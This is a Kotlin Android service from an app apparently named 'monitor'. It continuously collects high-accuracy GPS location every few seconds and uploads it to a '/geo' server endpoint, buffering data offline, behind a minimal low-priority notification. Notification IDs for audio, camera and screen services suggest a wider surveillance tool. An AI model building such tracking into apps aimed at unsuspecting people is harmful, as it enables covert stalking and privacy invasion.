package com.br.monitor

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import org.json.JSONObject

class LocationService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var fusedClient: FusedLocationProviderClient
    private var buffer: OfflineBuffer? = null

    private val callback = object : LocationCallback() {
        override fun onLocationResult(result: LocationResult) {
            result.lastLocation?.let { loc ->
                val payload = JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lng", loc.longitude)
                    put("acc", loc.accuracy)
                    put("alt", loc.altitude)
                    put("speed", loc.speed)
                    put("ts", loc.time)
                }.toString()

                scope.launch {
                    val ok = ApiClient.post("/geo", JSONObject(payload))
                    if (!ok) buffer?.push("geo", payload)
                }
            }
        }
    }

    @SuppressLint("MissingPermission")
    override fun onCreate() {
        super.onCreate()
        buffer = OfflineBuffer(applicationContext)
        fusedClient = LocationServices.getFusedLocationProviderClient(this)

        startForeground(NotifIds.LOCATION, buildNotif())

        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, Config.GEO_INTERVAL_MS)
            .setMinUpdateIntervalMillis(3_000L)
            .build()

        fusedClient.requestLocationUpdates(req, callback, Looper.getMainLooper())
    }

    override fun onDestroy() {
        fusedClient.removeLocationUpdates(callback)
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotif(): Notification {
        val ch = "loc"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel(ch, "Location", NotificationManager.IMPORTANCE_LOW)
            )
        }
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("Location")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}

object NotifIds {
    const val MAIN = 1
    const val LOCATION = 2
    const val AUDIO = 3
    const val CAMERA = 4
    const val SCREEN = 5
}
